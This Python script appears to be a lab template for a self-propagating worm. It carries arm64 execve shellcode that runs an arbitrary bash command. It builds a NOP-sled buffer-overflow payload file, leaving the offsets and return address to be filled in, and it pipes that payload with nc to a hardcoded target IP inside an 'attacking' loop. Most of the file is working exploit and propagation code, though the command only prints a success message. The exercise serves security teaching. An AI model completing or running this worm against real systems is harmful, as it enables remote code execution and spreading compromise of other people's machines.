#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint


# You can use this shellcode to run any command you want
shellcode= (
   "\xab\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
   "\x28\x05\x80\xd2\x69\x6a\x28\x38\x88\x05\x80\xd2\x69\x6a\x28\x38"
   "\xe8\x1d\x80\xd2\x69\x6a\x28\x38\x09\x04\x80\xd2\xe9\x03\x09\xcb"
   "\x69\x02\x09\xcb\x08\x01\x08\xca\x69\x6a\x28\xf8\x08\x01\x80\xd2"
   "\x49\x05\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8"
   "\x08\x02\x80\xd2\x09\x06\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb"
   "\x69\x6a\x28\xf8\x08\x03\x80\xd2\x29\x01\x09\xca\x69\x6a\x28\xf8"
   "\x09\x04\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb\xe0\x03\x09\xaa"
   "\xe1\x03\x13\xaa\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2"
   "\xe1\x66\x02\xd4"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
   "/bin/bash*"
   "-c****"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same.
   # The * in this line serves as the position marker              *
   "echo '(^_^) SUCCESS SUCCESS (^_^)';                             "
   "                                                                "
   "                                                               *"
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():

    # Fill the content with NOP's (0xD503201F is NOP instruction in arm64)
   nop = (0xD503201F).to_bytes(4,byteorder='little')
   content = bytearray(517)
   for offset in range(int(500/4)):
       content[offset*4:offset*4 + 4] = nop

   ##################################################################
   # Put the shellcode somewhere in the payload
   start = 00     # Need to change 
   content[start:start + len(shellcode)] = shellcode

   # Decide the return address value
   # and put it somewhere in the payload
   ret    = 0x00  # Need to change
   offset = 0x00  # Need to change

   content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)



# Find the next victim (return an IP address).
# Check to make sure that the target is alive.
def getNextTarget():
   return '10.151.0.71'

############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)

